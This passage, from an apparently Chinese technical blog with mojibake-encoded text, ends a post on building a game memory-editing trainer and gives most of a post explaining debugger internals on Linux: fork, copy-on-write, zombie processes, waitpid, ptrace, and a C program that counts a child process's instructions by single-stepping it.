<p>ç”±äº CE åªæ˜¯ä¸€ä¸ªå†…å­˜ä¿®æ”¹å·¥å…·ï¼Œè™½ç„¶èƒ½å¤Ÿä»¥ CT è¡¨çš„å½¢å¼ä½œä¸ºä¿®æ”¹å™¨ä½¿ç”¨ï¼Œä½†æ˜¯å¤šæ•°æƒ…å†µä¸‹è¿˜æ˜¯å¸Œæœ›æœ‰ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰“å¼€ä¹‹åæŒ‰ä¸‹å¯¹åº”çš„çƒ­é”®å³å¯å®ç°ä¿®æ”¹åŠŸèƒ½ã€‚æ‰€ä»¥åˆ©ç”¨ C++ ç¼–å†™ä¿®æ”¹å™¨æ˜¯å¿…é¡»çš„ã€‚</p>
<p>ä¿®æ”¹å™¨åŸºæœ¬åŠŸèƒ½å‰é¢æåˆ°è¿‡ï¼Œé¦–å…ˆéœ€è¦èƒ½å¤Ÿé™„åŠ åˆ°è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ OpenProcess æ¥å®ç°ï¼Œå®ƒè¿”å›ä¸€ä¸ªè¿›ç¨‹çš„å¥æŸ„ã€‚</p>
<p>è¯»å–æ¸¸æˆæŒ‡å®šåœ°å€çš„å†…å­˜å¯ä½¿ç”¨ ReadProcessMemory å®ç°ï¼Œå†™å…¥å†…å­˜å°±æ˜¯ WriteProcessMemoryã€‚</p>
<p>è¿™é‡Œæš‚ä¸”ä¸è®¨è®ºå†…éƒ¨ä¿®æ”¹å™¨çš„å®ç°æ–¹å¼ã€‚</p>
<p>å‰©ä¸‹çš„éƒ½æ˜¯ç¼–ç é—®é¢˜äº†ï¼Œæˆ‘æŠŠè‡ªå·±å†™çš„ä¿®æ”¹å™¨ demo ä¸Šä¼ åˆ° githubï¼Œé¡¹ç›®ä¸­ä»£ç éƒ½å¾ˆç®€å•ï¼ŒåŸºæœ¬æ€è·¯å¦‚ä¸Šæ‰€è¯‰ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥å»çœ‹çœ‹ã€‚<a class="link"   href="https://github.com/rrrrrrri/MyEtGTrainer" >https://github.com/rrrrrrri/MyEtGTrainer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>GAME</category>
      </categories>
  </entry>
  <entry>
    <title>è°ƒè¯•å™¨çš„åŸç†</title>
    <url>/2020/02/21/dig_debugger/</url>
    <content><![CDATA[<p>å­¦ä¹ è°ƒè¯•å™¨çš„åŸºæœ¬åŸç†ã€‚</p>
<span id="more"></span>

<h2 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h2><p><strong>è¿›ç¨‹</strong>ï¼šè¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿèµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œæ“ä½œç³»ç»Ÿä½¿ç”¨è¿›ç¨‹æ§åˆ¶å—(PCB)æ¥è¡¨ç¤ºä¸€ä¸ªè¿›ç¨‹ã€‚è¿›ç¨‹æœ‰å±äºä»–è‡ªå·±çš„å †æ ˆç©ºé—´ï¼Œæœ‰ä¸€å®šçš„ä¼˜å…ˆçº§ï¼Œæ¯ä¸ªè¿›ç¨‹æœ‰ç‹¬ä¸€æ— äºŒçš„ PIDã€‚</p>
<p><strong>fork å‡½æ•°</strong>ï¼šLinux ä¸­æä¾›çš„ç”¨äºåˆ›å»ºæ–°è¿›ç¨‹çš„å‡½æ•°ã€‚</p>
<p>fork å‡½æ•°åŸå‹ï¼š pid_t fork(void)ï¼Œè°ƒç”¨ fork å‡½æ•°çš„è¿›ç¨‹ç§°ä½œçˆ¶è¿›ç¨‹ï¼Œè¢«åˆ›å»ºçš„è¿›ç¨‹ç§°ä½œå­è¿›ç¨‹ã€‚å¦‚æœå‡½æ•°æ‰§è¡ŒæˆåŠŸï¼Œçˆ¶è¿›ç¨‹è¿”å›å­è¿›ç¨‹çš„ PIDï¼Œå­è¿›ç¨‹è¿”å› 0ã€‚å¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œè¿”å›è´Ÿæ•°ã€‚</p>
<p>fork é€šè¿‡å®Œå…¨å¤åˆ¶çˆ¶è¿›ç¨‹çš„èµ„æºåˆ›å»ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä½œä¸ºçˆ¶è¿›ç¨‹çš„ä¸€ä¸ªå‰¯æœ¬å­˜åœ¨ï¼Œçˆ¶å­è¿›ç¨‹å‡ ä¹æ˜¯å®Œå…¨ç›¸åŒçš„ã€‚<strong>ä¸¤è€…éƒ½ä» fork ä¹‹åå¼€å§‹è¿è¡Œ</strong>ã€‚<br>åº•å±‚åŸç†ï¼šfork é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œè¿›ç¨‹è¢«å­˜æ”¾åœ¨ä»»åŠ¡é˜Ÿåˆ—(åŒå‘å¾ªç¯é“¾è¡¨)ä¸­ï¼Œé“¾è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯è¿›ç¨‹æè¿°ç¬¦(PCBï¼Œè¿›ç¨‹æ§åˆ¶å—)ã€‚å†…æ ¸é€šè¿‡ PID è¡¨ç¤ºæ¯ä¸€ä¸ªè¿›ç¨‹ï¼Œé»˜è®¤æœ€å¤§å€¼ä¸º 32768 ã€‚å¯åœ¨ &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max æŸ¥çœ‹ã€‚</p>
<p>fork å‘¼å«ç³»ç»Ÿè°ƒç”¨ï¼ŒCPU æ§åˆ¶æµè½¬å‘å†…æ ¸ fork ä»£ç ï¼Œå†…æ ¸ä¼šåš 4 ä»¶äº‹æƒ…ï¼š</p>
<ol>
<li>ç»™å­è¿›ç¨‹åˆ†é…å†…å­˜å’Œå†…æ ¸çº¿ç¨‹</li>
<li>å°†çˆ¶è¿›ç¨‹çš„éƒ¨åˆ†æ•°æ®æ‹·è´åˆ°å­è¿›ç¨‹</li>
<li>å°†å­è¿›ç¨‹æ·»åŠ åˆ°è¿›ç¨‹åˆ—è¡¨</li>
<li>fork è¿”å›ï¼Œå¼€å§‹è°ƒåº¦æ‰§è¡Œã€‚</li>
</ol>
<p>fork ç³»åˆ—å‡½æ•°éƒ½æ˜¯ clone ç³»ç»Ÿè°ƒç”¨çš„å°è£…ï¼Œæ ¹æ®ä¸åŒå‡½æ•°è®¾ç½®ä¸åŒçš„è°ƒç”¨å‚æ•°ã€‚</p>
<p>fork ç”Ÿæˆçš„å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹å…±äº«ä»£ç æ®µï¼Œå¯¹äºæ•°æ®æ®µé‡‡ç”¨å†™æ—¶å¤åˆ¶æŠ€æœ¯ã€‚</p>
<p><strong>å†™æ—¶å¤åˆ¶</strong>ï¼šå¯¹æ¯ä¸ªå†…å­˜åŒºåŸŸæ·»åŠ ä¸€ä¸ªè®¡æ•°å™¨ï¼Œæ¯å½“ä¸€ä¸ªæŒ‡é’ˆå¼•ç”¨äº†è¿™å—å†…å­˜ï¼Œè®¡æ•°å™¨å°±åŠ ä¸€ã€‚æ¯å½“ä¸€ä¸ªæŒ‡é’ˆé‡Šæ”¾äº†å†…å­˜ï¼Œè®¡æ•°å™¨å°±å‡ä¸€ã€‚</p>
<p>ä¸¤ä¸ªè¿›ç¨‹(æˆ–å¤šä¸ªè¿›ç¨‹)å…±äº«ä¸€ä»½å†…å­˜é¡µï¼Œè¿™ä¸ªå†…å­˜é¡µè¢«ç³»ç»Ÿæ ‡è®°ä¸ºå†™ä¿æŠ¤ã€‚å½“ä¸€ä¸ªè¿›ç¨‹æƒ³è¦ä¿®æ”¹é¡µé¢å†…çš„æ•°æ®ï¼Œä¼šå› ä¸ºæƒé™é—®é¢˜è§¦å‘å¼‚å¸¸ã€‚æ“ä½œç³»ç»Ÿæ•è·è¿™ä¸ªå¼‚å¸¸ï¼Œå°†å—ä¿æŠ¤çš„å†…å­˜é¡µå¤åˆ¶å‡ºæ¥ä¸€ä»½åˆ°æ–°çš„é¡µé¢ï¼Œå¹¶ä¿®æ”¹ä¿æŠ¤æ ‡è®°ä¸ºå¯å†™ã€‚æƒ³è¦ä¿®æ”¹å†…å­˜æ•°æ®çš„è¿›ç¨‹å°±å»ä½¿ç”¨æ–°å¤åˆ¶å‡ºæ¥çš„é¡µé¢ã€‚åŸæ¥çš„å†…å­˜é¡µä¾ç„¶æ˜¯å†™ä¿æŠ¤çš„ï¼Œå½“å…¶ä»–è¿›ç¨‹è¯•å›¾ä¿®æ”¹çš„æ—¶å€™ï¼Œç³»ç»Ÿæ£€æµ‹å…±äº«è¿™ä¸ªé¡µé¢çš„è¿›ç¨‹æ•°é‡ï¼Œç¡®å®šå†™é¡µé¢çš„è¿›ç¨‹æ˜¯å¦æ‹¥æœ‰è¿™ä¸ªå†…å­˜é¡µï¼Ÿå¦‚æœæ˜¯ï¼Œå°±æŠŠè¿™ä¸ªå†…å­˜é¡µæ ‡è®°ä¸ºå¯¹å±ä¸»å¯å†™ã€‚</p>
<p><strong>åƒµå°¸è¿›ç¨‹</strong>ï¼šå’Œç°å®ä¸€æ ·ï¼Œçˆ¶è¿›ç¨‹æœ‰ä¹‰åŠ¡å»ç›‘ç®¡å­è¿›ç¨‹(çˆ¶äº²å¯¹å­©å­æœ‰æŠšå…»ä¹‰åŠ¡)ï¼Œå½“å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•æˆ–è€…åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°æŸäº›é”™è¯¯é€€å‡ºä¹‹åï¼Œçˆ¶è¿›ç¨‹éœ€è¦è°ƒç”¨ waitpid æ¥æ¸…ç†å­è¿›ç¨‹çš„å†…æ ¸ PCB ç»“æ„ã€‚å¦‚æœçˆ¶è¿›ç¨‹æ²¡æœ‰æ­£ç¡®çš„å¤„ç†å­è¿›ç¨‹ç›¸å…³ä¿¡æ¯(çˆ¶äº²è·‘è·¯äº†)ï¼Œé‚£ä¹ˆå­è¿›ç¨‹ä¼šå˜æˆåƒµå°¸è¿›ç¨‹(å­¤å„¿)ã€‚å…¶ä¿å­˜åœ¨å†…æ ¸çš„ PCB æ²¡äººæ¥æ¸…ç†ã€‚</p>
<p>ç†è®ºä¸Šæ‰€æœ‰åˆšåˆšç»“æŸçš„è¿›ç¨‹éƒ½æ˜¯åƒµå°¸è¿›ç¨‹ï¼Œä½†æ˜¯å®ƒä»¬çš„çˆ¶è¿›ç¨‹ä¼šåŠæ—¶çš„æ¸…ç†è¿™äº›å·²ç»ç»“æŸçš„è¿›ç¨‹(å®ƒä»¬çš„çˆ¶äº²å¾ˆæœ‰è´£ä»»å¿ƒ)ï¼Œæ‰€ä»¥æ­£å¸¸ä½¿ç”¨ç³»ç»Ÿçš„æ—¶å€™å¾ˆå°‘ä¼šçœ‹è§åƒµå°¸è¿›ç¨‹ã€‚æŸäº›è½¯ä»¶ç¼–å†™å­˜åœ¨ç–æ¼ï¼Œå°±ä¼šå‡ºç°åƒµå°¸è¿›ç¨‹ã€‚</p>
<p>ä¾‹å¦‚çˆ¶è¿›ç¨‹è°ƒç”¨ fork å¯åŠ¨äº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹å®Œæˆä»»åŠ¡ç»“æŸï¼Œä½†æ˜¯çˆ¶è¿›ç¨‹æ—¢ä¸æ¸…ç†ï¼Œä¹Ÿä¸é€€å‡ºï¼Œå¯¼è‡´å­è¿›ç¨‹å˜æˆå­¤å„¿ã€‚æ­¤æ—¶ç³»ç»Ÿçœ‹ä¸è¿‡å»äº†ï¼Œä¼šå°†åƒµå°¸è¿›ç¨‹çš„çˆ¶è¿›ç¨‹å˜æ›´æˆ init è¿™ä¸ªè€å¤§å“¥ã€‚å› ä¸º init æ˜¯æ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼Œä¼šä¼´éšç€æ•´ä¸ªç³»ç»Ÿçš„è¿è¡Œï¼Œè€å¤§å“¥ä¼šåœ¨ä¸€å®šæ—¶é—´å¯¹åƒµå°¸è¿›ç¨‹è¿›è¡Œæ¸…ç†ï¼Œå®é™…ä¸Šè¿™å°±æ˜¯ç³»ç»Ÿå¯åŠ¨å®Œæ¯•ä¹‹å init è¿›ç¨‹çš„ä¸»è¦èŒè´£ã€‚</p>
<h2 id="è°ƒè¯•å™¨åŸºæœ¬åŸç†"><a href="#è°ƒè¯•å™¨åŸºæœ¬åŸç†" class="headerlink" title="è°ƒè¯•å™¨åŸºæœ¬åŸç†"></a>è°ƒè¯•å™¨åŸºæœ¬åŸç†</h2><p>è°ƒè¯•å™¨åº”è¯¥å…·æœ‰çš„åŠŸèƒ½ï¼š</p>
<ol>
<li>è¿½è¸ªè¿›ç¨‹è¿è¡Œï¼Œèƒ½å¤Ÿæ§åˆ¶æ‰§è¡Œæµã€‚</li>
<li>è®¿é—®è¿›ç¨‹çš„å †æ ˆå†…å­˜ï¼Œå¹¶ä¸”å¯ä»¥éšæ—¶ä¿®æ”¹ã€‚</li>
<li>æ·»åŠ æ–­ç‚¹ï¼Œèƒ½å¤Ÿå•æ­¥æ‰§è¡Œè¿›ç¨‹æ¯æ¡æŒ‡ä»¤</li>
<li>éšæ—¶æ”¹å˜è¿›ç¨‹ä»£ç ï¼Œå¹¶ä¸”èƒ½å¤Ÿç«‹å³äº§ç”Ÿå½±å“ã€‚</li>
</ol>
<p>è°ƒè¯•å™¨è¿˜æœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œä½†æ˜¯å…·æœ‰ä»¥ä¸ŠåŠŸèƒ½çš„è°ƒè¯•å™¨å·²ç»å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ã€‚</p>
<p>ç°ä»£è°ƒè¯•å™¨ä¸€èˆ¬æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯åˆ©ç”¨ CPU æä¾›çš„è°ƒè¯•å·¥å…·ï¼Œä¾‹å¦‚ Intel CPU æä¾›äº† INT 3 æ–­ç‚¹ã€ç¡¬ä»¶è°ƒè¯•å¯„å­˜å™¨ç­‰ã€‚äºŒæ˜¯é’ˆå¯¹ä¸åŒæ¶æ„å®ç°ä¸åŒçš„ä»¿çœŸå™¨ï¼Œæ¨¡æ‹Ÿ CPU ã€å†…å­˜ç­‰ä¸€åˆ‡å¤–å›´è®¾æ–½ï¼Œæ­¤æ—¶è°ƒè¯•å™¨å¯¹è¿›ç¨‹æ‹¥æœ‰ç»å¯¹çš„æ§åˆ¶æƒã€‚</p>
<p>ç›®å‰å‡ ä¹æ‰€æœ‰è°ƒè¯•å™¨éƒ½é‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼ï¼Œå³ä½¿ç”¨ CPU æä¾›çš„è°ƒè¯•å·¥å…·ã€‚</p>
<p>è°ƒè¯•å™¨çš„åŸºæœ¬æ€è·¯ï¼š</p>
<ol>
<li>å°†è‡ªèº«é™„åŠ åˆ°è¿›ç¨‹</li>
<li>æ³¨å†Œä¸ºè°ƒè¯•å™¨</li>
<li>è¯»å–è¿›ç¨‹ä»£ç æ®µï¼Œåˆ©ç”¨åæ±‡ç¼–å¼•æ“å¤„ç†æˆæ±‡ç¼–æŒ‡ä»¤ï¼Œè¾“å‡ºåˆ°å±å¹•</li>
<li>æ ¹æ®ç”¨æˆ·é€‰æ‹©çš„æŒ‡ä»¤æ’å…¥ INT3 æ–­ç‚¹</li>
<li>æ“ä½œç³»ç»Ÿæ•è· INT3ï¼Œå¯»æ‰¾æ³¨å†Œçš„è°ƒè¯•å™¨</li>
<li>æ•è·ä¿¡å·ï¼Œå°†è¢«æ›¿æ¢çš„æŒ‡ä»¤è¿˜åŸ</li>
<li>å•æ­¥è¿è¡Œï¼Œè¯»å–å †æ ˆå†…å­˜ç­‰</li>
</ol>
<p>ä»¥ä¸Šæ˜¯åŸºæœ¬çš„è°ƒè¯•å™¨å®ç°æ€è·¯ï¼Œä½†æ˜¯åœ¨ Linux ä¸­æˆ‘ä»¬æœ‰ä¸€ä¸ªæ›´å¥½ç”¨çš„å·¥å…·ï¼šptrace</p>
<p>ptrace æ˜¯ Linux æä¾›çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶è§’è‰²å’Œ Windows ä¸­çš„ä¸€ç³»åˆ—å’Œè¿›ç¨‹æœ‰å…³ API ç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ ptrace è®¿é—®ç›®æ ‡è¿›ç¨‹çš„å¯„å­˜å™¨ï¼Œæ§åˆ¶ç›®æ ‡è¿›ç¨‹çš„æŒ‡ä»¤æ‰§è¡Œç­‰ã€‚</p>
<p>wait ç³»ç»Ÿè°ƒç”¨ï¼šLinux man page æè¿°å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">waitã€waitpidã€waitid è¿™å‡ ä¸ªç³»ç»Ÿè°ƒç”¨è¢«ç”¨äºç­‰å¾…è°ƒç”¨è€…çš„å­è¿›ç¨‹çŠ¶æ€æ”¹å˜ã€‚</span><br><span class="line">çŠ¶æ€æ”¹å˜æ„å‘³ç€å­è¿›ç¨‹ç»ˆæ­¢ã€å­è¿›ç¨‹æ”¶åˆ°ä¿¡å·åœæ­¢æˆ–æ˜¯å­è¿›ç¨‹æ”¶åˆ°ä¿¡å·é‡æ–°è¿è¡Œï¼Œ</span><br><span class="line">å¯¹äºç»ˆæ­¢çš„å­è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹è°ƒç”¨ waitpid å…è®¸æ“ä½œç³»ç»Ÿå¯¹è¿™ä¸ªå­è¿›ç¨‹è¿›è¡Œèµ„æºå›æ”¶ï¼Œå¦åˆ™å­è¿›ç¨‹å°†ä¼šå˜æˆåƒµå°¸è¿›ç¨‹ã€‚</span><br></pre></td></tr></table></figure></div>

<p>wait ç³»ç»Ÿè°ƒç”¨ wait(&amp;status) ç›¸å½“äº waitpid(-1, &amp;status, 0);</p>
<p>waitpid æš‚åœè°ƒç”¨å®ƒçš„è¿›ç¨‹ï¼Œç›´åˆ°æ¥æ”¶åˆ°å­è¿›ç¨‹çš„çŠ¶æ€æ”¹å˜ä¿¡å·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤ç³»ç»Ÿè°ƒç”¨åªç­‰å¾…ç»ˆæ­¢è¿›ç¨‹çš„å‡ºç°ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹ option å‚æ•°æ¥ä¿®æ”¹å…¶è¡Œä¸ºã€‚</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ PIDï¼Œå–å€¼å¦‚ä¸‹</p>
<ol>
<li>PID &lt; -1ï¼Œwaitpid ç­‰å¾…æ‰€æœ‰è¿›ç¨‹ç»„ ID å’Œ PID ç»å¯¹å€¼ç›¸ç­‰çš„å­è¿›ç¨‹</li>
<li>PID &#x3D;&#x3D; -1ï¼Œç­‰å¾…æ‰€æœ‰å­è¿›ç¨‹</li>
<li>PID &#x3D;&#x3D; 0ï¼Œç­‰å¾…æ‰€æœ‰è¿›ç¨‹ç»„ ID å’Œè°ƒç”¨è€… pid ç›¸ç­‰çš„å­è¿›ç¨‹</li>
<li>PID &gt; 0ï¼Œç­‰å¾… pid å’Œ PID ç›¸ç­‰çš„å­è¿›ç¨‹</li>
</ol>
<p>waitpid çš„ option æœ‰å¾ˆå¤šï¼Œå…·ä½“å¯å‚è€ƒ man pageã€‚</p>
<p>ptrace ç³»ç»Ÿè°ƒç”¨ï¼šLinux man page æè¿°å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptrace ç³»ç»Ÿè°ƒç”¨å…è®¸ä¸€ä¸ªè¿›ç¨‹ç›‘è§†å…¶ä»–è¿›ç¨‹çš„å†…å­˜å’Œå¯„å­˜å™¨å¸ƒå±€ï¼Œå®ƒä¸»è¦è¢«ç”¨äºå®ç°æ–­ç‚¹è°ƒè¯•æˆ–æ˜¯è¿½è¸ªç³»ç»Ÿè°ƒç”¨ã€‚</span><br><span class="line">è¢«è¿½è¸ªçš„è¿›ç¨‹é¦–å…ˆéœ€è¦è¢«è¿½è¸ªå™¨é™„åŠ ï¼Œåœ¨ä¸€ä¸ªå¤šçº¿ç¨‹çš„è¿›ç¨‹ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½å¯ä»¥è¢«ä¸€ä¸ªè¿½è¸ªå™¨é™„åŠ ï¼Œæˆ–æ˜¯ä¸è¢«é™„åŠ è€Œæ­£å¸¸è¿è¡Œã€‚æ‰€ä»¥è¢«è¿½è¸ªçš„é€šå¸¸æ˜¯â€œçº¿ç¨‹â€è€Œä¸æ˜¯â€œè¿›ç¨‹â€ã€‚</span><br><span class="line">ä¸€ä¸ªè¿›ç¨‹å¯ä»¥é€šè¿‡ fork åˆ›å»ºå­è¿›ç¨‹ï¼Œåœ¨å­è¿›ç¨‹ä¸­ä½¿ç”¨ PTRACE_TRACEME è¯·æ±‚çˆ¶è¿›ç¨‹å¯¹å…¶è¿›è¡Œè¿½è¸ªã€‚</span><br><span class="line">åœ¨è¿½è¸ªè¿‡ç¨‹ä¸­ï¼Œè¢«è¿½è¸ªè¿›ç¨‹æ¯æ¬¡æ¥æ”¶åˆ°ä¿¡å·çš„æ—¶å€™å°±ä¼šæš‚åœ(SIGKILL ä¿¡å·é™¤å¤–)ï¼Œè¿½è¸ªè€…å¯ä½¿ç”¨ waitpid ç­‰ç³»ç»Ÿè°ƒç”¨è·å–åˆ°å­è¿›ç¨‹æš‚åœè¿™ä¸€äº‹å®ï¼Œå½“å­è¿›ç¨‹å¤„äºæš‚åœçŠ¶æ€çš„è¿‡ç¨‹ä¸­ï¼Œè¿½è¸ªè€…å¯ä»¥ä½¿ç”¨ ptrace ç³»åˆ—å·¥å…·å¯¹å­è¿›ç¨‹è¿›è¡Œå„ç§ä¿®æ”¹ï¼Œè¿½è¸ªè€…å¯é€‰æ‹©ç»§ç»­æ‰§è¡Œå­è¿›ç¨‹ï¼Œç”šè‡³ç»™å­è¿›ç¨‹ä¼ é€’ä¸åŒçš„ä¿¡å·ã€‚</span><br><span class="line">å¦‚æœ PTRACE_O_TRACEEXEC é€‰é¡¹æ²¡æœ‰ç”Ÿæ•ˆï¼Œé‚£ä¹ˆè¢«è¿½è¸ªè¿›ç¨‹æ¯æ¬¡è°ƒç”¨ execve çš„æ—¶å€™ï¼Œéƒ½ä¼šæ”¶åˆ° SIGTRAP ä¿¡å·ï¼Œç»™è¿½è¸ªè€…è·å–å®ƒæ§åˆ¶æƒçš„æœºä¼šã€‚</span><br><span class="line">è¿½è¸ªè€…ç»“æŸè¿½è¸ªä¹‹åå¯é€šè¿‡ PTRACE_DETACH ä½¿å­è¿›ç¨‹ç»§ç»­æ­£å¸¸è¿è¡Œã€‚</span><br></pre></td></tr></table></figure></div>



<h2 id="å®ç°æœ€ç®€å•çš„è°ƒè¯•å™¨"><a href="#å®ç°æœ€ç®€å•çš„è°ƒè¯•å™¨" class="headerlink" title="å®ç°æœ€ç®€å•çš„è°ƒè¯•å™¨"></a>å®ç°æœ€ç®€å•çš„è°ƒè¯•å™¨</h2><p>é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨ç³»ç»Ÿæä¾›çš„ ptrace å®ç°ä¸€ä¸ªæœ€ç®€å•çš„è°ƒè¯•å™¨ï¼Ÿ</p>
<p>æ ¹æ®å‰é¢äº†è§£åˆ°çš„æœ‰å…³çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯é‡‡ç”¨ ptrace + waitpid + fork æ–¹å¼å®ç°çˆ¶è¿›ç¨‹å¯¹å­è¿›ç¨‹çš„è°ƒè¯•ã€‚</p>
<p>åŸºæœ¬æ€è·¯</p>
<ol>
<li>çˆ¶è¿›ç¨‹é€šè¿‡ fork åˆ›å»ºå­è¿›ç¨‹</li>
<li>å­è¿›ç¨‹åˆ©ç”¨ PTRACE_TRACEME é€šçŸ¥æ“ä½œç³»ç»Ÿï¼Œè¦æ±‚å…¶çˆ¶è¿›ç¨‹å¯¹è‡ªå·±è¿›è¡Œè¿½è¸ªã€‚</li>
<li>å­è¿›ç¨‹åˆ©ç”¨ exec æ‰§è¡Œå…¶ä»–ç¨‹åºï¼Œæ­¤æ—¶ç”±äº ptrace çš„å­˜åœ¨ï¼Œå­è¿›ç¨‹ä¼šæ”¶åˆ° SIGTRAP ä¿¡å·è€Œæš‚åœã€‚</li>
<li>çˆ¶è¿›ç¨‹ä½¿ç”¨ waitpid ç­‰å¾…ï¼Œç›´åˆ°å­è¿›ç¨‹æš‚åœï¼Œæ­¤æ—¶çˆ¶è¿›ç¨‹å¯ä¿®æ”¹å­è¿›ç¨‹çš„å†…å­˜æˆ–å¯„å­˜å™¨ã€‚</li>
<li>çˆ¶è¿›ç¨‹å®Œæˆä¿®æ”¹ï¼Œé€šè¿‡ ptrace ä½¿å­è¿›ç¨‹å•æ­¥è¿è¡Œï¼Œçˆ¶è¿›ç¨‹ç»§ç»­ä½¿ç”¨ waitpid ç­‰å¾…å­è¿›ç¨‹æš‚åœï¼Œä¸æ–­å¾ªç¯ã€‚</li>
</ol>
<p>åŸºäºä»¥ä¸Šæ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ä¸€ä¸ªæœ€ç®€å•çš„ç»Ÿè®¡ç¨‹åº CPU æŒ‡ä»¤æ•°é‡çš„è°ƒè¯•å™¨ã€‚</p>
<p>ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">startProcess</span><span class="params">(<span class="type">char</span>* fileName)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Process starting!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;  <span class="comment">// å‘ŠçŸ¥æ“ä½œç³»ç»Ÿï¼Œè¦æ±‚çˆ¶è¿›ç¨‹è¿½è¸ªè‡ªå·±</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ptrace Error!1\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	execl(fileName, fileName, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">// è°ƒç”¨ exec çš„æ—¶å€™å­è¿›ç¨‹æ”¶åˆ° SIGTRAP ä¿¡å·æš‚åœ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyDebugger</span><span class="params">(<span class="type">pid_t</span> childPid)</span>&#123;</span><br><span class="line">	<span class="type">int</span> wait_status;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> icounter = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	wait(&amp;wait_status);  <span class="comment">// çˆ¶è¿›ç¨‹æ”¶åˆ°å­è¿›ç¨‹çš„ SIGTRAP åœæ­¢ä¿¡æ¯</span></span><br><span class="line">	<span class="keyword">while</span>(WIFSTOPPED(wait_status))&#123;  <span class="comment">// åˆ¤æ–­å­è¿›ç¨‹æ˜¯å¦åœæ­¢</span></span><br><span class="line">		icounter++; <span class="comment">// æŒ‡ä»¤è®¡æ•°å™¨ +1</span></span><br><span class="line">		<span class="keyword">if</span>(ptrace(PTRACE_SINGLESTEP, childPid, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123; <span class="comment">// å‘ŠçŸ¥å­è¿›ç¨‹è¿è¡Œä¸€æ¡æŒ‡ä»¤ä¹‹åå†æ¬¡æš‚åœ</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ptrace Error!2\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		wait(&amp;wait_status);  <span class="comment">// ç»§ç»­ç­‰å¾…å­è¿›ç¨‹æš‚åœ</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target run %d instructions!\n&quot;</span>, icounter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> 